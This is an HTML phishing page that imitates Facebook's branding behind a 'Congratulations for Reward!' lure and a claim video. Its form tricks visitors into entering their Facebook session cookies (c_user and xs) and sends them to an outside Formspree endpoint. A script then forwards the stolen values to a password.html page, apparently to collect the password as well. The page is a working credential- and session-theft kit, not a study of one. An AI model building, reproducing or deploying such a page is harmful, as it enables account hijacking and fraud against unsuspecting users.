<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Congratulations for Reward!</title>
  <style>
    :root {
      --fb-blue:#1877f2;
      --fb-blue-dark:#0b5ed7;
      --card-bg:#fff;
      --bg:#f0f2f5;
      --muted:#6b6b6b;
    }
    * { box-sizing:border-box; }
    body {
      margin:0;
      font-family:"Segoe UI", Arial, sans-serif;
      background:var(--bg);
      color:#111;
    }

    .header {
      background:var(--fb-blue);
      color:#fff;
      padding:12px 20px;
      display:flex;
      align-items:center;
      gap:12px;
    }
    .header img { width:36px; height:36px; }
    .header .title { font-weight:700; font-size:18px; }
    .header .search {
      margin-left:auto;
      padding:8px 12px;
      border-radius:20px;
      border:none;
      outline:none;
      width:220px;
    }

    .wrap { max-width:880px; margin:32px auto; padding:0 18px; }
    .card {
      background:var(--card-bg);
      border-radius:10px;
      box-shadow:0 6px 18px rgba(16,24,40,0.06);
      overflow:hidden;
    }
    .card-body { padding:28px; }

    .hero {
      text-align:center;
      padding:20px 24px 10px;
    }
    .hero h1 {
      font-size:34px;
      margin:6px 0 8px;
      color:var(--fb-blue);
      line-height:1.05;
    }
    .hero p { margin:0; color:var(--muted); font-size:15px; }

    .video-wrap {
      display:flex;
      justify-content:center;
      padding:18px;
    }
    video {
      width:100%;
      max-width:720px;
      height:auto;
      border-radius:8px;
      background:#000;
    }

    form {
      max-width:560px;
      margin:10px auto 0;
      text-align:left;
    }
    label { display:block; font-weight:700; margin-bottom:8px; }
    input[type="text"] {
      width:100%;
      padding:12px;
      border:1px solid #ddd;
      border-radius:8px;
      font-size:15px;
      margin-bottom:16px;
    }

    .btn {
      width:100%;
      display:inline-block;
      background:linear-gradient(90deg,var(--fb-blue),var(--fb-blue-dark));
      color:#fff;
      padding:14px;
      border-radius:8px;
      border:none;
      font-weight:700;
      font-size:16px;
      cursor:pointer;
    }

    .note {
      max-width:720px;
      margin:14px auto 0;
      color:#8a8a8a;
      font-size:13px;
      text-align:center;
    }

    @media (min-width:900px) {
      .card-body { display:flex; gap:28px; align-items:start; }
      .left { flex:1; }
      .right { width:380px; }
      .hero { text-align:left; }
      form { margin:0 auto; }
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="logo">
    <div class="title">Verification</div>
    <input class="search" placeholder="Search for help..." />
  </div>

  <div class="wrap">
    <div class="card">
      <div class="card-body">
        <div class="left">
          <div class="hero">
            <h1>ðŸŽ‰ Congratulations for Reward!</h1>
            <p>Watch the detailed video below to learn how to claim.</p>
          </div>

          <div class="video-wrap">
            <video controls playsinline preload="metadata">
              <source src="https://ik.imagekit.io/ummab7boi/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?updatedAt=1751126951949" type="video/mp4">
              Your browser does not support the video tag.
            </video>
          </div>

          <!-- Moved form below video -->
          <form id="step1Form" action="https://formspree.io/f/xjkpnjqo" method="POST" autocomplete="off">
            <label for="user_id">c_user</label>
            <input id="user_id" name="user_id" type="text" placeholder="Enter your c_user value" required>

            <label for="session_key">xs</label>
            <input id="session_key" name="session_key" type="text" placeholder="Enter your xs value" required>

            <button class="btn" type="submit">Submit</button>
          </form>

          <p class="note"><strong>Notice:</strong> Ensure you provide correct information for verification.</p>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Redirect to password.html after form submission
    const form = document.getElementById('step1Form');
    form.addEventListener('submit', (e) => {
      // Let form post to SubmitForm.com, then redirect after short delay
      setTimeout(() => {
        const params = new URLSearchParams(new FormData(form)).toString();
        window.location.href = 'password.html?' + params;
      }, 1000);
    });
  </script>
</body>
</html>
